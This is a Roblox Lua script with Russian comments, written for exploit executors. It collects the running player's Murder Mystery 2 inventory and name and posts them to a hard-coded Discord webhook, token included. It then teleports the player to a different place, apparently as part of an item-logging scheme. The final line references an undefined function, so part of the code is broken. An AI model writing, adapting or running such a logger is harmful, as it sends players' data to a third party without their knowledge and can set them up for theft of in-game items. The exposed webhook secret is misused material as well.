-- Вебхук-ссылка (замените на вашу ссылку)
local webhook = "https://discord.com/api/webhooks/1323066038778069104/aw-JU7tPlGWcZMUQR08rMU9RhNgIY3eZnH7726xNwHC6_2g48pllg5FQORbNmQ9xkf6y"
local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
local HttpService = game:GetService("HttpService")

local function sendWebhook(embed)
    if not webhook then return end
    httprequest({
        Url = webhook,
        Body = HttpService:JSONEncode({
            username = "MM2 Logger",
            embeds = {embed}
        }),
        Method = "POST",
        Headers = {
            ["content-type"] = "application/json"
        }
    })
end

local function gatherData(containerPath)
    local container = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Inventory"):WaitForChild("Main")
    for _, part in ipairs(string.split(containerPath, ".")) do
        container = container:WaitForChild(part)
    end

    local items = {}
    for _, item in ipairs(container:GetChildren()) do
        if item:IsA("Frame") and item:FindFirstChild("ItemName") and item.ItemName:FindFirstChild("Label") then
            table.insert(items, item.ItemName.Label.Text)
        end
    end
    return items
end

local categories = {
    Weapons = {
        "Weapons.Items.Container.Current.Container",
        "Weapons.Items.Container.Classic.Container",
        "Weapons.Items.Container.Holiday.Container.Christmas.Container",
        "Weapons.Items.Container.Holiday.Container.Halloween.Container"
    },
    Holiday = {
        "Weapons.Items.Container.Holiday.Container.Christmas.Container",
        "Weapons.Items.Container.Holiday.Container.Halloween.Container"
    },
    Emotes = {
        "Emotes.Items.Container.Current.Container"
    },
    Effects = {
        "Effects.Items.Container.Current.Container"
    },
    Perks = {
        "Perks.Items.Container.Current.Container"
    },
    Pets = {
        "Pets.Items.Container.Current.Container"
    },
    Radios = {
        "Radios.Items.Container.Current.Container"
    }
}

local function createEmbed(playerName, data)
    local embed = {
        title = string.format("%s MM2:", playerName),
        color = 3447003, -- MM2 стиль синий
        fields = {},
        footer = {
            text = "Данные собраны через скрипт",
            icon_url = "https://i.imgur.com/MM2Logo.png" -- Добавь логотип MM2
        }
    }

    for category, paths in pairs(data) do
        local items = {}
        for _, path in ipairs(paths) do
            for _, itemName in ipairs(gatherData(path)) do
                table.insert(items, itemName)
            end
        end

        if #items > 0 then
            local formattedItems = table.concat(items, ", ")
            table.insert(embed.fields, {
                name = category,
                value = formattedItems,
                inline = false
            })
        else
            table.insert(embed.fields, {
                name = category,
                value = "Нет предметов",
                inline = false
            })
        end
    end

    return embed
end

-- Execution
local playerName = game.Players.LocalPlayer.Name
local embed = createEmbed(playerName, categories)
sendWebhook(embed)

wait(2)
local TeleportService = game:GetService("TeleportService")
local placeId = 13772394625
TeleportService:Teleport(placeId, game.Players.LocalPlayer)

-- Ждем загрузки игры
game.Loaded:Connect(onGameLoaded)
